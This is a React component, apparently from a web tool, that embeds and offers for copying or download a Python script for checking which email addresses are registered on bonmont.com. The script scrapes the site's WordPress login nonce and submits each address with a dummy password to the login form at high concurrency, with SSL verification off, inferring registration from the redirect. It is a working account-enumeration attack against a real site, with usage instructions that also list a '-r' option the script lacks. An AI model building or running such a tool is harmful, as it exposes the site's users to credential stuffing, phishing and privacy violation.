import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Copy, Download, Terminal, BookOpen, Check } from "lucide-react";
import { toast } from "sonner";
import { TEST_IDS } from "@/constants/testIds";

const API = `${process.env.REACT_APP_BACKEND_URL}/api`;

const SCRIPT_CONTENT = `#!/usr/bin/env python3
"""
Bonmont.com Email Checker
Verifie si des adresses e-mail sont enregistrees sur bonmont.com
"""
import argparse, asyncio, csv, re, sys, time
from pathlib import Path

try:
    import aiohttp
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
    import aiohttp
try:
    from tqdm import tqdm
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "tqdm"])
    from tqdm import tqdm

TARGET_URL = "https://bonmont.com/connexion/"
INVALID_MARKER = "opinions-login-error=invalid_email"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Referer": TARGET_URL, "Origin": "https://bonmont.com",
}

async def extract_nonce(session):
    """Extract WordPress nonce from the login page."""
    async with session.get(TARGET_URL, headers=HEADERS,
                           timeout=aiohttp.ClientTimeout(total=10)) as resp:
        body = await resp.text()
        m = re.search(r'id="opinions-login-nonce"[^>]*value="([^"]+)"', body)
        return m.group(1) if m else ""

async def check_email(session, email, sem, nonce, retries=3):
    async with sem:
        for attempt in range(retries):
            try:
                data = {
                    "opinions_login[email]": email.strip(),
                    "opinions_login[password]": "check123",
                    "opinions_login[submit]": "Se connecter",
                    "opinions-login-nonce": nonce,
                    "_wp_http_referer": "/connexion/",
                }
                async with session.post(TARGET_URL, data=data,
                    allow_redirects=False, timeout=aiohttp.ClientTimeout(total=15),
                    headers=HEADERS) as resp:
                    loc = resp.headers.get("Location", "")
                    if INVALID_MARKER in loc:
                        return email, "invalid"
                    if resp.status in (301, 302, 303, 307, 308):
                        return email, "valid"
                    body = await resp.text()
                    return email, "invalid" if INVALID_MARKER in body else "valid"
            except Exception as e:
                if attempt == retries - 1:
                    return email, f"error:{str(e)[:50]}"
                await asyncio.sleep(1)
        return email, "error:max_retries"

async def main_check(emails, concurrency=10, delay=0.5):
    sem = asyncio.Semaphore(concurrency)
    results = []
    conn = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        nonce = await extract_nonce(session)
        with tqdm(total=len(emails), desc="Check", unit="email") as pbar:
            tasks = []
            for i, e in enumerate(emails):
                tasks.append(asyncio.create_task(check_email(session, e, sem, nonce)))
                if (i+1) % concurrency == 0: await asyncio.sleep(delay)
            for coro in asyncio.as_completed(tasks):
                results.append(await coro); pbar.update(1)
    return results

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Bonmont Email Checker")
    p.add_argument("input", help="Fichier emails (.txt/.csv)")
    p.add_argument("-o", "--output", default="resultats.csv")
    p.add_argument("-c", "--concurrency", type=int, default=10)
    p.add_argument("-d", "--delay", type=float, default=0.5)
    args = p.parse_args()
    emails = []
    with open(args.input) as f:
        for line in f:
            e = line.strip()
            if e and "@" in e: emails.append(e)
    print(f"\\n  {len(emails)} emails trouves")
    results = asyncio.run(main_check(emails, args.concurrency, args.delay))
    with open(args.output, "w", newline="") as f:
        w = csv.writer(f); w.writerow(["email","status"])
        for e, s in sorted(results): w.writerow([e, s])
    v = sum(1 for _,s in results if s=="valid")
    i = sum(1 for _,s in results if s=="invalid")
    print(f"  Valides: {v} | Invalides: {i} | Total: {len(results)}")
    print(f"  Resultats: {args.output}\\n")`;

export default function CliDocs() {
  const [copied, setCopied] = useState(false);

  const copyCode = () => {
    navigator.clipboard.writeText(SCRIPT_CONTENT);
    setCopied(true);
    toast.success("Script copie dans le presse-papiers");
    setTimeout(() => setCopied(false), 2000);
  };

  const downloadScript = () => {
    window.open(`${API}/checker-script`, "_blank");
  };

  return (
    <Card className="bg-zinc-900/50 border-zinc-800/60">
      <CardHeader className="pb-3">
        <CardTitle className="font-heading text-lg font-semibold text-zinc-100 flex items-center gap-2">
          <Terminal size={18} className="text-emerald-500" />
          Script CLI Python
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="script">
          <TabsList className="bg-zinc-900 border border-zinc-800/60">
            <TabsTrigger
              data-testid={TEST_IDS.cliTabPythonScript}
              value="script"
              className="data-[state=active]:bg-zinc-800 data-[state=active]:text-emerald-400 text-xs"
            >
              <Terminal size={13} className="mr-1.5" /> Script
            </TabsTrigger>
            <TabsTrigger
              data-testid={TEST_IDS.cliTabInstructions}
              value="instructions"
              className="data-[state=active]:bg-zinc-800 data-[state=active]:text-emerald-400 text-xs"
            >
              <BookOpen size={13} className="mr-1.5" /> Instructions
            </TabsTrigger>
          </TabsList>

          <TabsContent value="script" className="mt-4">
            <div className="flex gap-2 mb-3">
              <Button
                data-testid={TEST_IDS.cliCopyCodeButton}
                variant="outline"
                size="sm"
                onClick={copyCode}
                className="gap-1.5 text-xs border-zinc-700/60 text-zinc-300 hover:text-zinc-100"
              >
                {copied ? <Check size={14} className="text-emerald-400" /> : <Copy size={14} />}
                {copied ? "Copie !" : "Copier"}
              </Button>
              <Button
                data-testid={TEST_IDS.cliDownloadScriptButton}
                variant="outline"
                size="sm"
                onClick={downloadScript}
                className="gap-1.5 text-xs border-zinc-700/60 text-zinc-300 hover:text-zinc-100"
              >
                <Download size={14} /> Telecharger checker.py
              </Button>
            </div>
            <div className="code-block p-4 max-h-[420px] overflow-y-auto">
              <pre className="text-xs leading-relaxed">
                <code className="text-zinc-400 whitespace-pre">{SCRIPT_CONTENT}</code>
              </pre>
            </div>
          </TabsContent>

          <TabsContent value="instructions" className="mt-4 space-y-4">
            <div className="space-y-3 text-sm text-zinc-300">
              <div className="code-block p-4">
                <p className="text-xs font-mono text-zinc-500 mb-2"># 1. Installer les dependances</p>
                <code className="text-emerald-400">pip install aiohttp tqdm</code>
              </div>
              <div className="code-block p-4">
                <p className="text-xs font-mono text-zinc-500 mb-2"># 2. Preparer un fichier emails.txt (un email par ligne)</p>
                <code className="text-zinc-400">
                  user1@example.com{"\n"}
                  user2@example.com{"\n"}
                  user3@example.com
                </code>
              </div>
              <div className="code-block p-4">
                <p className="text-xs font-mono text-zinc-500 mb-2"># 3. Lancer le checker</p>
                <code className="text-emerald-400">python3 checker.py emails.txt -o resultats.csv</code>
              </div>
              <div className="code-block p-4">
                <p className="text-xs font-mono text-zinc-500 mb-2"># Options avancees</p>
                <code className="text-zinc-400">
                  python3 checker.py emails.csv -o out.csv -c 20 -d 0.2{"\n\n"}
                  <span className="text-zinc-600">  -c, --concurrency  Requetes simultanees (defaut: 10){"\n"}</span>
                  <span className="text-zinc-600">  -d, --delay        Delai entre batches en sec (defaut: 0.5){"\n"}</span>
                  <span className="text-zinc-600">  -r, --retries      Tentatives par email (defaut: 3){"\n"}</span>
                  <span className="text-zinc-600">  -o, --output       Fichier de sortie (defaut: resultats.csv)</span>
                </code>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
}
